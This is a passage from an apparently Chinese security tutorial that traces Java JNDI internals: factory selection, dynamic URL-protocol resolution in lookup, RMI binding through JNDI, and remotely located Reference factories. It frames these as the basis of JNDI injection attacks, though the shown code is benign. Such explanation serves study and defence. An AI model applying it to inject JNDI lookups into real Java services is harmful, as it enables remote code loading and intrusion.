        <span class="token class-name">InitialContextFactory</span> factory<span class="token punctuation">;</span>

        <span class="token class-name">InitialContextFactoryBuilder</span> builder <span class="token operator">=</span> <span class="token function">getInitialContextFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>builder <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// No factory installed, use property</span>
            <span class="token comment">// Get initial context factory class name</span>

            <span class="token class-name">String</span> className <span class="token operator">=</span> env <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span>
                <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>env<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>className <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">NoInitialContextException</span> ne <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NoInitialContextException</span><span class="token punctuation">(</span>
                    <span class="token string">&quot;Need to specify class name in environment or system &quot;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;property, or as an applet parameter, or in an &quot;</span> <span class="token operator">+</span>
                    <span class="token string">&quot;application resource file:  &quot;</span> <span class="token operator">+</span>
                    <span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> ne<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                factory <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InitialContextFactory</span><span class="token punctuation">)</span>
                    helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">NoInitialContextException</span> ne <span class="token operator">=</span>
                    <span class="token keyword">new</span> <span class="token class-name">NoInitialContextException</span><span class="token punctuation">(</span>
                        <span class="token string">&quot;Cannot instantiate class: &quot;</span> <span class="token operator">+</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>
                ne<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> ne<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            factory <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">createInitialContextFactory</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> factory<span class="token punctuation">.</span><span class="token function">getInitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><p>首先是<code>getInitialContextFactoryBuilder()</code>尝试去拿能创建工厂类的builder接口，这个值可以初始化设置，并且createInitialContextFactory方法能返回所需要的工厂类;</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token comment">// ------------ Initial Context Factory Stuff</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">InitialContextFactoryBuilder</span> initctx_factory_builder <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * Use this method for accessing initctx_factory_builder while
     * inside an unsynchronized method.
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> <span class="token class-name">InitialContextFactoryBuilder</span>
    <span class="token function">getInitialContextFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> initctx_factory_builder<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">setInitialContextFactoryBuilder</span><span class="token punctuation">(</span>
        <span class="token class-name">InitialContextFactoryBuilder</span> builder<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>initctx_factory_builder <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span>
                    <span class="token string">&quot;InitialContextFactoryBuilder already set&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">SecurityManager</span> security <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>security <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                security<span class="token punctuation">.</span><span class="token function">checkSetFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            initctx_factory_builder <span class="token operator">=</span> builder<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>当这个builder未初始化时，才会找<code>Context.INITIAL_CONTEXT_FACTORY</code>,将这个工厂类通过<code>helper</code>加载进来并调用接口对应的<code>getInitialContext</code>方法返回实际的上下文。在这里就是调用了<code>com.sun.jndi.dns.DnsContextFactory.getInitialContext()</code></p> <p>同理，我们也可以通过JNDI来进行RMI的相关操作</p> <p>比如Server访问Registry绑定远程通过JNDI写就可以写成</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name">Calc</span> calc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//通过JNDI拿到Registry</span>
<span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;rmi://localhost:21099&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">InitialContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//通过JNDI进行绑定</span>
ctx<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">,</span> calc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;calc bound&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ctx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>Client访问Registry拿对象就可以写成</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token comment">//通过JNDI拿到Registry</span>
<span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;rmi://localhost:21099&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">InitialContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//通过JNDI进行绑定</span>
<span class="token class-name">ICalc</span> calc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ICalc</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ctx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> li <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
li<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
li<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>calc<span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>从这里也可以看出Context和我们在RMI篇中讲到的Registry的方法是类似的，事实上对应任何一个<code>JNDI Context</code>来说都支持</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>bind(Name name, Object obj) 
	将名称绑定到对象。 
list(String name) 
	枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
lookup(String name) 
	检索命名对象。 
rebind(String name, Object obj) 
	将名称绑定到对象，覆盖任何现有绑定。 
unbind(String name) 
	取消绑定命名对象。 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>对于<code>DirContext</code>来说，还支持<code>search/createSubcontext/getSchema/getSchemaClassDefinition</code>,这也符合我们之前所说的目录服务</p> <p>JNDI作为一套抽象的实现规范来说并不存在具体的安全问题。不过在实际使用中，特别是结合具体协议，也出现了很多攻击面。</p> <h2 id="_0x03-jndi-的动态协议加载"><a href="#_0x03-jndi-的动态协议加载" class="header-anchor">#</a> 0x03 JNDI 的动态协议加载</h2> <p>有趣的是即使我们指定了<code>ContextFactroy</code>比如刚才dns查询的用法,然后使用<code>ctx.lookup(&quot;rmi://localhost:21099/calc&quot;);</code>会发现自动返回了rmi协议的对象。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_93c1e124abea6641e0f41f1e4452aeaf.png" alt=""></p> <p>如果我们跟进源码会看到在Lookup时，会调用</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">getURLOrDefaultInitCtx</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="https://md.buptmerak.cn/uploads/upload_0f6d910b7affcf00306547a3d9b1dc3a.png" alt=""></p> <p>这里解析出了使用的url协议传入<code>NamingManager.getURLContext</code>中</p> <p><code>NamingManager.hasInitialContextFactoryBuilder()</code>为false的情况下(为真需要显式地指定NamingManger的<code>initialContextFactoryBuilder</code>)如果传入的url是带协议的，那么就会根据协议去获得对应的Context，实现如下</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> defaultPkgPrefix <span class="token operator">=</span> <span class="token string">&quot;com.sun.jndi.url&quot;</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * Creates an object for the given URL scheme id using
     * the supplied urlInfo.
     * &lt;p&gt;
     * If urlInfo is null, the result is a context for resolving URLs
     * with the scheme id 'scheme'.
     * If urlInfo is a URL, the result is a context named by the URL.
     * Names passed to this context is assumed to be relative to this
     * context (i.e. not a URL). For example, if urlInfo is
     * &quot;ldap://ldap.wiz.com/o=Wiz,c=us&quot;, the resulting context will
     * be that pointed to by &quot;o=Wiz,c=us&quot; on the server 'ldap.wiz.com'.
     * Subsequent names that can be passed to this context will be
     * LDAP names relative to this context (e.g. cn=&quot;Barbs Jensen&quot;).
     * If urlInfo is an array of URLs, the URLs are assumed
     * to be equivalent in terms of the context to which they refer.
     * The resulting context is like that of the single URL case.
     * If urlInfo is of any other type, that is handled by the
     * context factory for the URL scheme.
     * @param scheme the URL scheme id for the context
     * @param urlInfo information used to create the context
     * @param name name of this object relative to &lt;code&gt;nameCtx&lt;/code&gt;
     * @param nameCtx Context whose provider resource file will be searched
     *          for package prefix values (or null if none)
     * @param environment Environment properties for creating the context
     * @see javax.naming.InitialContext
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">getURLObject</span><span class="token punctuation">(</span><span class="token class-name">String</span> scheme<span class="token punctuation">,</span> <span class="token class-name">Object</span> urlInfo<span class="token punctuation">,</span>
                                       <span class="token class-name">Name</span> name<span class="token punctuation">,</span> <span class="token class-name">Context</span> nameCtx<span class="token punctuation">,</span>
                                       <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> environment<span class="token punctuation">)</span>
            <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>

        <span class="token comment">// e.g. &quot;ftpURLContextFactory&quot;</span>
        <span class="token class-name">ObjectFactory</span> factory <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ObjectFactory</span><span class="token punctuation">)</span><span class="token class-name">ResourceManager</span><span class="token punctuation">.</span><span class="token function">getFactory</span><span class="token punctuation">(</span>
            <span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">URL_PKG_PREFIXES</span><span class="token punctuation">,</span> environment<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span>
            <span class="token string">&quot;.&quot;</span> <span class="token operator">+</span> scheme <span class="token operator">+</span> <span class="token string">&quot;.&quot;</span> <span class="token operator">+</span> scheme <span class="token operator">+</span> <span class="token string">&quot;URLContextFactory&quot;</span><span class="token punctuation">,</span> defaultPkgPrefix<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
          <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

        <span class="token comment">// Found object factory</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> factory<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>urlInfo<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span> environment<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">NamingException</span> ne <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ne<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> ne<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br></div></div><p>也就是说默认支持这几类
<img src="https://md.buptmerak.cn/uploads/upload_0e05db43eba7fdb7e35f7e51e28f5ceb.png" alt=""></p> <p>如果我们观察源码会发现，类似的<code>bind/rebind/...</code>等的<code>initalContext</code>的方法都会首先进入这个函数也就会动态的去解析传入的<code>name</code>，转换成<code>name</code>对应的<code>Context</code>去进行相应的目录操作。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_1ff182d8460a69d26cdf81bb83a289a4.png" alt=""></p> <p>也就是说通过向<code>JNDI Context</code>的方法里注入协议，我们可以结合其他协议开展攻击，这也是为什么这种攻击手法被称之为JNDI注入攻击</p> <h2 id="_0x04-jndi-的-reference"><a href="#_0x04-jndi-的-reference" class="header-anchor">#</a> 0x04 JNDI 的 Reference</h2> <p>在前面我们提到了目录服务中存在一种特殊对象<code>Reference</code>即引用,其一共有如下四种构造方法：</p> <ul><li>Reference(String className)  为类名为<code>className</code>的对象构造一个新的引用。</li> <li>Reference(String className, RefAddr addr) 为类名为<code>className</code>的对象和地址构造一个新引用。</li> <li>Reference(String className, RefAddr addr, String factory, String factoryLocation) 为类名为<code>className</code>的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。</li> <li>Reference(String className, String factory, String factoryLocation)
为类名为<code>className</code>的对象以及对象工厂的类名和位置构造一个新引用。</li></ul> <p>如果说<code>Reference</code>相当于一个指针，那么<code>RefAddr</code>就相当于这个指针对应的地址了,比如在上一篇RMI服务中远程对象的存根就相当于是一个地址，客户端根据地址访问相应服务。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_5ae5cb6cc121cc293ae3a2d0a5cd6d19.png" alt=""></p> <p><code>RefAddr</code>默认会有个<code>addrType</code>来表示地址类型</p> <p>除了地址以外<code>Reference</code>也支持工厂类的方式去远程加载一个工厂类在本地创建对象。下面我们根据具体JNDI承载的协议来分析。</p> <h2 id="_0x05-jndi-rmi"><a href="#_0x05-jndi-rmi" class="header-anchor">#</a> 0x05 JNDI + RMI</h2> <p>在上一篇RMI协议的文章中，我们在分析RMI协议远程类加载的时候提到了codebase。而有趣的是，java rmi提供了ReferenceWrapper用来将JNDI的Reference包装成一个rmi中的远程对象。我们知道Reference只是存了一个引用，那么怎么将引用转换成一个可用的对象呢。</p> <p>比如有</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> word<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token class-name">String</span> word<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>word <span class="token operator">=</span> word<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;Demo{&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;word='&quot;</span> <span class="token operator">+</span> word <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token char">'}'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoFactory</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObjectInstance</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Name</span> name<span class="token punctuation">,</span> <span class="token class-name">Context</span> nameCtx<span class="token punctuation">,</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;DemoFactory::getObjectInstance&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;obj %s name %s nameCtx %s&quot;</span><span class="token punctuation">,</span>obj<span class="token punctuation">,</span>name<span class="token punctuation">,</span>nameCtx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;environment&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        environment<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;key: %s value:%s&quot;</span><span class="token punctuation">,</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> word <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> environment<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;word&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
